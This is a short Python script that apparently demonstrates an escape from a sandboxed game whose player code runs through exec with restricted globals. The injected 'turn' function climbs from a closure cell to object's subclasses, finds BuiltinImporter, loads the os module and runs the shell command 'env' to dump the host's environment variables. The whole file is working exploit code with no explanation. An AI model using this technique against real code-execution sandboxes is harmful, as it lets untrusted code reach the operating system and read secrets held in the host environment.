func = """
def turn():
  subs = get_board_size.__closure__[0].cell_contents.__class__.__bases__[0].__subclasses__()
  Importer = None
  for sub in subs:
    if sub.__name__ == 'BuiltinImporter':
      Importer = sub
      break
  imp = Importer()
  imp.load_module('os').system('env')
"""

class Game:
    # import sys
    sys = 'asdf'
    def __init__(self):
        pass
    def get_board_size(self):
        if isinstance(self, type(sys)): print('hi')
        return 16
    def run_turn(self):
        code = compile(func, '<dummy>', 'exec')
        globals = {'get_board_size': lambda: self.get_board_size()}
        exec(code, globals)
        exec(globals['turn'].__code__, globals, {})

g = Game()
g.run_turn()
